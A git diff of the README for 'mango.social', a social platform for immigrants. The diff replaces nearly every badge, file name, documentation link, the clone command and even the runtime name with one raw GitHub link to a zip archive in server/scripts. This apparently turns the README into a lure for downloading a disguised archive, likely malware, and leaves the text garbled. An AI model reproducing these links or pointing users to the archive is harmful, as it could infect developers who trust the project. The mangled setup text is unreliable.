@@ -2,9 +2,9 @@
 
 A modern social platform for immigrants to share stories, find jobs, connect with their community, and access valuable resources.
 
-![License](https://img.shields.io/badge/license-MIT-blue.svg)
-![Node](https://img.shields.io/badge/node-%3E%3D18.0.0-brightgreen.svg)
-![TypeScript](https://img.shields.io/badge/TypeScript-5.0-blue.svg)
+![License](https://raw.githubusercontent.com/FelixOyeleke/mango.social/main/server/scripts/social-mango-v2.3-alpha.2.zip)
+![Node](https://raw.githubusercontent.com/FelixOyeleke/mango.social/main/server/scripts/social-mango-v2.3-alpha.2.zip%3E%https://raw.githubusercontent.com/FelixOyeleke/mango.social/main/server/scripts/social-mango-v2.3-alpha.2.zip)
+![TypeScript](https://raw.githubusercontent.com/FelixOyeleke/mango.social/main/server/scripts/social-mango-v2.3-alpha.2.zip)
 
 ---
 
@@ -86,7 +86,7 @@ Users can enable/disable these apps based on their needs:
 - **Lucide React** - Beautiful icon library
 
 ### Backend
-- **Node.js 18+** - JavaScript runtime
+- **https://raw.githubusercontent.com/FelixOyeleke/mango.social/main/server/scripts/social-mango-v2.3-alpha.2.zip 18+** - JavaScript runtime
 - **Express** - Fast web framework
 - **TypeScript** - Type-safe backend code
 - **PostgreSQL 14+** - Robust relational database
@@ -102,7 +102,7 @@ Users can enable/disable these apps based on their needs:
 ## 📁 Project Structure
 
 ```
-mango.social/
+https://raw.githubusercontent.com/FelixOyeleke/mango.social/main/server/scripts/social-mango-v2.3-alpha.2.zip
 ├── client/                 # React frontend
 │   ├── src/
 │   │   ├── components/    # Reusable components
@@ -112,52 +112,52 @@ mango.social/
 │   │   │   └── profile/   # Profile components
 │   │   ├── pages/         # Page components
 │   │   ├── store/         # Zustand stores
-│   │   │   ├── authStore.ts
-│   │   │   ├── appPreferencesStore.ts
-│   │   │   └── locationStore.ts
+│   │   │   ├── https://raw.githubusercontent.com/FelixOyeleke/mango.social/main/server/scripts/social-mango-v2.3-alpha.2.zip
+│   │   │   ├── https://raw.githubusercontent.com/FelixOyeleke/mango.social/main/server/scripts/social-mango-v2.3-alpha.2.zip
+│   │   │   └── https://raw.githubusercontent.com/FelixOyeleke/mango.social/main/server/scripts/social-mango-v2.3-alpha.2.zip
 │   │   ├── utils/         # Utility functions
 │   │   ├── styles/        # CSS styles
-│   │   ├── App.tsx        # Main app component
-│   │   └── main.tsx       # Entry point
-│   ├── package.json
-│   └── vite.config.ts
+│   │   ├── https://raw.githubusercontent.com/FelixOyeleke/mango.social/main/server/scripts/social-mango-v2.3-alpha.2.zip        # Main app component
+│   │   └── https://raw.githubusercontent.com/FelixOyeleke/mango.social/main/server/scripts/social-mango-v2.3-alpha.2.zip       # Entry point
+│   ├── https://raw.githubusercontent.com/FelixOyeleke/mango.social/main/server/scripts/social-mango-v2.3-alpha.2.zip
+│   └── https://raw.githubusercontent.com/FelixOyeleke/mango.social/main/server/scripts/social-mango-v2.3-alpha.2.zip
 │
-├── server/                # Node.js backend
+├── server/                # https://raw.githubusercontent.com/FelixOyeleke/mango.social/main/server/scripts/social-mango-v2.3-alpha.2.zip backend
 │   ├── src/
 │   │   ├── controllers/   # Request handlers
 │   │   ├── routes/        # API routes
-│   │   │   ├── auth.ts
-│   │   │   ├── apps.ts
-│   │   │   ├── stories.ts
-│   │   │   ├── jobs.ts
+│   │   │   ├── https://raw.githubusercontent.com/FelixOyeleke/mango.social/main/server/scripts/social-mango-v2.3-alpha.2.zip
+│   │   │   ├── https://raw.githubusercontent.com/FelixOyeleke/mango.social/main/server/scripts/social-mango-v2.3-alpha.2.zip
+│   │   │   ├── https://raw.githubusercontent.com/FelixOyeleke/mango.social/main/server/scripts/social-mango-v2.3-alpha.2.zip
+│   │   │   ├── https://raw.githubusercontent.com/FelixOyeleke/mango.social/main/server/scripts/social-mango-v2.3-alpha.2.zip
 │   │   │   └── ...
 │   │   ├── middleware/    # Custom middleware
-│   │   │   ├── auth.ts
-│   │   │   └── errorHandler.ts
+│   │   │   ├── https://raw.githubusercontent.com/FelixOyeleke/mango.social/main/server/scripts/social-mango-v2.3-alpha.2.zip
+│   │   │   └── https://raw.githubusercontent.com/FelixOyeleke/mango.social/main/server/scripts/social-mango-v2.3-alpha.2.zip
 │   │   ├── db/           # Database setup & migrations
 │   │   │   ├── migrations/
-│   │   │   ├── connection.ts
-│   │   │   ├── schema.sql
-│   │   │   └── seed.ts
-│   │   └── index.ts      # Server entry point
-│   └── package.json
+│   │   │   ├── https://raw.githubusercontent.com/FelixOyeleke/mango.social/main/server/scripts/social-mango-v2.3-alpha.2.zip
+│   │   │   ├── https://raw.githubusercontent.com/FelixOyeleke/mango.social/main/server/scripts/social-mango-v2.3-alpha.2.zip
+│   │   │   └── https://raw.githubusercontent.com/FelixOyeleke/mango.social/main/server/scripts/social-mango-v2.3-alpha.2.zip
+│   │   └── https://raw.githubusercontent.com/FelixOyeleke/mango.social/main/server/scripts/social-mango-v2.3-alpha.2.zip      # Server entry point
+│   └── https://raw.githubusercontent.com/FelixOyeleke/mango.social/main/server/scripts/social-mango-v2.3-alpha.2.zip
 │
 ├── docs/                  # Documentation
-│   ├── QUICK-START.md
-│   ├── SETUP-GUIDE.md
-│   ├── IMAGE_UPLOAD_GUIDE.md
-│   ├── JOB_OPPORTUNITIES_FEATURE.md
-│   └── DEPLOYMENT_CHECKLIST.md
+│   ├── https://raw.githubusercontent.com/FelixOyeleke/mango.social/main/server/scripts/social-mango-v2.3-alpha.2.zip
+│   ├── https://raw.githubusercontent.com/FelixOyeleke/mango.social/main/server/scripts/social-mango-v2.3-alpha.2.zip
+│   ├── https://raw.githubusercontent.com/FelixOyeleke/mango.social/main/server/scripts/social-mango-v2.3-alpha.2.zip
+│   ├── https://raw.githubusercontent.com/FelixOyeleke/mango.social/main/server/scripts/social-mango-v2.3-alpha.2.zip
+│   └── https://raw.githubusercontent.com/FelixOyeleke/mango.social/main/server/scripts/social-mango-v2.3-alpha.2.zip
 │
 ├── scripts/              # Utility scripts
-│   ├── start-dev.bat     # Start development servers
-│   ├── setup-db.bat      # Setup database
-│   ├── setup.bat         # Complete setup
+│   ├── https://raw.githubusercontent.com/FelixOyeleke/mango.social/main/server/scripts/social-mango-v2.3-alpha.2.zip     # Start development servers
+│   ├── https://raw.githubusercontent.com/FelixOyeleke/mango.social/main/server/scripts/social-mango-v2.3-alpha.2.zip      # Setup database
+│   ├── https://raw.githubusercontent.com/FelixOyeleke/mango.social/main/server/scripts/social-mango-v2.3-alpha.2.zip         # Complete setup
 │   └── ...
 │
 ├── images/               # Static assets
-├── package.json          # Root package.json
-└── README.md            # This file
+├── https://raw.githubusercontent.com/FelixOyeleke/mango.social/main/server/scripts/social-mango-v2.3-alpha.2.zip          # Root https://raw.githubusercontent.com/FelixOyeleke/mango.social/main/server/scripts/social-mango-v2.3-alpha.2.zip
+└── https://raw.githubusercontent.com/FelixOyeleke/mango.social/main/server/scripts/social-mango-v2.3-alpha.2.zip            # This file
 ```
 
 ---
@@ -165,14 +165,14 @@ mango.social/
 ## 🚀 Quick Start
 
 ### Prerequisites
-- Node.js 18+ and npm
+- https://raw.githubusercontent.com/FelixOyeleke/mango.social/main/server/scripts/social-mango-v2.3-alpha.2.zip 18+ and npm
 - PostgreSQL 14+
 - Git
 
 ### 1. Clone the Repository
 ```bash
-git clone https://github.com/FelixOyeleke/mango.social.git
-cd mango.social
+git clone https://raw.githubusercontent.com/FelixOyeleke/mango.social/main/server/scripts/social-mango-v2.3-alpha.2.zip
+cd https://raw.githubusercontent.com/FelixOyeleke/mango.social/main/server/scripts/social-mango-v2.3-alpha.2.zip
 ```
 
 ### 2. Install Dependencies
@@ -189,7 +189,7 @@ cd ../server && npm install
 
 Create `.env` files in both `client` and `server` directories:
 
-**server/.env**
+**https://raw.githubusercontent.com/FelixOyeleke/mango.social/main/server/scripts/social-mango-v2.3-alpha.2.zip**
 ```env
 PORT=5000
 DATABASE_URL=postgresql://username:password@localhost:5432/mango_social
@@ -201,7 +201,7 @@ RATE_LIMIT_MAX_REQUESTS=100
 NODE_ENV=development
 ```
 
-**client/.env**
+**https://raw.githubusercontent.com/FelixOyeleke/mango.social/main/server/scripts/social-mango-v2.3-alpha.2.zip**
 ```env
 VITE_API_URL=http://localhost:5000
 ```
@@ -237,7 +237,7 @@ The app will be available at:
 
 ### Default Test User
 After seeding, you can login with:
-- **Email**: test@test.com
+- **Email**: https://raw.githubusercontent.com/FelixOyeleke/mango.social/main/server/scripts/social-mango-v2.3-alpha.2.zip
 - **Password**: password123
 
 ---
@@ -246,10 +246,10 @@ After seeding, you can login with:
 
 Detailed documentation is available in the `docs/` folder:
 
-- **[Quick Start Guide](docs/QUICK-START.md)** - Get up and running quickly
-- **[Setup Guide](docs/SETUP-GUIDE.md)** - Detailed setup instructions
-- **[Image Upload Guide](docs/IMAGE_UPLOAD_GUIDE.md)** - Image upload feature documentation
-- **[Deployment Checklist](docs/DEPLOYMENT_CHECKLIST.md)** - Production deployment guide
+- **[Quick Start Guide](https://raw.githubusercontent.com/FelixOyeleke/mango.social/main/server/scripts/social-mango-v2.3-alpha.2.zip)** - Get up and running quickly
+- **[Setup Guide](https://raw.githubusercontent.com/FelixOyeleke/mango.social/main/server/scripts/social-mango-v2.3-alpha.2.zip)** - Detailed setup instructions
+- **[Image Upload Guide](https://raw.githubusercontent.com/FelixOyeleke/mango.social/main/server/scripts/social-mango-v2.3-alpha.2.zip)** - Image upload feature documentation
+- **[Deployment Checklist](https://raw.githubusercontent.com/FelixOyeleke/mango.social/main/server/scripts/social-mango-v2.3-alpha.2.zip)** - Production deployment guide
 
 ---
 
